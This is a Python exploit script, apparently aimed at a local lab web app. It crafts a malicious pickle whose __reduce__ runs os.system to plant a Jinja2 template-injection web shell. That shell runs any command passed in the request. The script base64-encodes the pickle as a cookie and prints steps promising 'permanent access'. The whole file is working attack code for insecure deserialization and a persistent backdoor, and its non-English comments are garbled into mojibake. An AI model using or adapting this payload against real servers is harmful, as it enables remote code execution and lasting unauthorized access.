import pickle
import base64
import os


class Backdoor_Payload:
    def __reduce__(self):
        # 转 转 专转: 祝 HTML 注 驻住  专爪
        shell_code = """
        <html>
        <body style="background:black; color:#0f0; font-family:monospace;">
            <h1> WEB SHELL BACKDOOR </h1>
            <form>
                CMD: <input type="text" name="cmd" size="50" autofocus>
                <input type="submit" value="Execute">
            </form>
            <pre>
            {% if request.args.get('cmd') %}
                {{ config.__class__.__init__.__globals__['os'].popen(request.args.get('cmd')).read() }}
            {% endif %}
            </pre>
        </body>
        </html>
        """

        # 驻拽 砖转转 转 拽抓 砖专转
        #  砖转砖 专拽 驻转  转 拽抓 拽住
        cmd = f"python -c \"open('shell.html', 'w').write('''{shell_code}''')\""

        return (os.system, (cmd,))


def generate_backdoor():
    payload = Backdoor_Payload()
    serialized = pickle.dumps(payload)
    encoded = base64.b64encode(serialized).decode()

    print(f"\n[+] BACKDOOR PAYLOAD GENERATED:\n")
    print(encoded)
    print("\n[!] INSTRUCTIONS:")
    print("1. Inject this cookie and refresh the page (Server will crash/error - that is normal).")
    print("2. Navigate to: http://127.0.0.1:5000/page/shell.html")
    print("3. Enjoy your permanent access!")


if __name__ == '__main__':
    generate_backdoor()